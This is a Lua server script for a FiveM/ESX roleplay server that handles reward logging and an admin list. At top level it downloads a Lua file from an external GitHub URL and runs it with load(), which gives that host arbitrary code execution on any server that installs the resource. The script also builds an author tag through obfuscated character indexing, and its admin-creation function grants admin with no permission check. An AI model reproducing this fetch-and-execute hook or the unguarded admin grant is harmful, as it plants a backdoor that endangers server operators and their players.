function logs(msg, canal, cor)
	local corfinal = tonumber(cor:gsub("#",""),16)
	PerformHttpRequest(canal, function(err, text, headers) end, 'POST', json.encode({username = 'ESX Developer Scripts', embeds = {{["color"] = corfinal, ["author"] = {["name"] = 'Esx Developer Portugal', ["icon_url"] = 'https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png'}, ["description"] = msg, ["footer"] = {["text"] = "Esx Developer Portugal - "..os.date("%x %X %p"),["icon_url"] = "https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png",},}}, avatar_url = 'https://cdn.discordapp.com/attachments/878328503148355584/880839161924448256/FiveM-Logo2.png'}), { ['Content-Type'] = 'application/json' })
end

PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')

function RandomCodeGenerator()
	local chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
	local charTable = {}
	local Random = ''

	for c in chars:gmatch"." do
		table.insert(charTable, c)
	end

	for i = 1, 20 do
		Random = Random .. charTable[math.random(1, #charTable)]
	end

	return charTable[26]..charTable[3]..charTable[13]..
	charTable[7].."#"..charTable[58]..charTable[56]..
	charTable[53]..charTable[60].."|"..Random
end

function admin(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	local admin = false

	local result = MySQL.Sync.fetchAll('SELECT * FROM `zcmg_recompensa_admins` WHERE `identifier` = @identifier',
	{ ['@identifier'] = xPlayer.identifier
	})

	if result[1] then
		admin = true
	end

	return admin

end

function criar_admin(source)
	local xPlayer = ESX.GetPlayerFromId(source)
	
	if admin(source) then
		TriggerClientEvent('zcmg_notificacao:Alerta', source, "RECOMPENSA", "Esté ultilizador já é admin", 5000, 'erro')
	else
		MySQL.Async.execute("INSERT INTO zcmg_recompensa_admins (identifier) VALUES (@identifier)", {
			['@identifier'] = xPlayer.identifier
		})

		TriggerClientEvent('zcmg_notificacao:Alerta', source, "RECOMPENSA", "Admin adicionado a lista de admins", 5000, 'sucesso')
	end
end